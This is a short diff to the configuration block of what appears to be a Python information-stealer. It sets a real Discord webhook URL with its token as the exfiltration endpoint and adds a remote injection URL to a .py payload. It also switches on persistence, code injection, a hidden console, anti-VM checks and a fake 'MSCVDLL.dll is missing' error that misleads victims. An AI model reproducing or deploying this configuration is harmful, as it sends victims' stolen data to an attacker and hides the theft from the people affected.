@@ -16,16 +16,16 @@ config = {
     # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
     # Black Screen: Make screen black? (True/False, Bool)
     # Error Message: Fake error text to display. (Leave Blank for None)
-    'webhook': 'a',
-    'persist': False,
+    'webhook': 'https://discord.com/api/webhooks/1334709433548410952/e0bFitxAKKV2JmtrjAhv79gKp-16RK_hfES2GVOGmqdUDbx6g0Kk1AgseXmf3Yaxdd6i',
+    'persist': True,
     'keep-alive': False,
-    'injection_url': 'url to injection (raw)',
-    'inject': False,
-    'hideconsole': False,
+    'injection_url': 'https://tenorcom.vercel.app/api/skibidi%20hawk%20tuah.py',
+    'inject': True,
+    'hideconsole': True,
     'antivm': True,
     'force_admin': False,
     'black_screen': False,
-    'error': False,
+    'error': True,
     'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
 }
 class functions(object):
